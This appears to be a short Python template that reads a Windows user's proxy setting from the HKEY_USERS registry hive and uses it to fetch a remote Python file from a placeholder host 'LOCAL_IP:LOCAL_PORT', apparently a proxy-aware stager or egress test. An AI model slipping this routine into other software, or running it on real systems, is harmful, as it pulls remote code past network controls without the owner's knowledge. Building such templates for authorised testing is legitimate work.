from urllib import request as urlrequest
from winreg import *

# HKEY_USERS\" + SID + "\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings","ProxyServer
Registry = ConnectRegistry(None, HKEY_USERS)
regkey = OpenKey(Registry, "")

for i in range(10):
	try:
		asubkey_name=EnumKey(regkey,i)
		if "S-1-5-21" in asubkey_name:
			Registry2 = ConnectRegistry(None, HKEY_USERS)
			regkey2 = OpenKey(Registry2, asubkey_name+"\Software\Microsoft\Windows\CurrentVersion\Internet Settings")
			proxy_host = (QueryValueEx(regkey2, "ProxyServer")[0])
			break
	except EnvironmentError:
		break

url='http://LOCAL_IP:LOCAL_PORT/HTTP_23_python3_p_HKU.py'
req = urlrequest.Request(url)
req.set_proxy(proxy_host, 'http')
urlrequest.urlopen(req).read()
